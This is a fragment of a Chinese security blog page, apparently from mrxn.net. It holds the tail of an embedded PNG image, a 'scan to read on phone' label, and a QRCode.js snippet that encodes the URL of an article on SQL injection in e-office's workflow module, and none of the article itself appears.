t7s66+/IZBp+xQ8+n4/m3smD30Pswbir/YG8WedHOJD8Nk+0PPQefX56wOppuf6+gncDMSnYOLqFuamD5k+BPXNQ3QI6kPnKx2Sgyva2xoRktGfaO6RDukz83IRek59ovfb6zcD2Zvn9c+fwDYQyFThPq626LRXaB2kv1yErttHf3L1ewi9Jxxze0N8OMZ5L0hu6vZTh56DcAiaK9wGUuRcrz+BcyCvn0HbwT8AAAD//7quPoAAAAAGSURBVAMABh6I8iVYO7sAAAAASUVORK5CYII=)

手机扫码阅读

物流软件安全


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-general-workflow-freerunimgflow-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 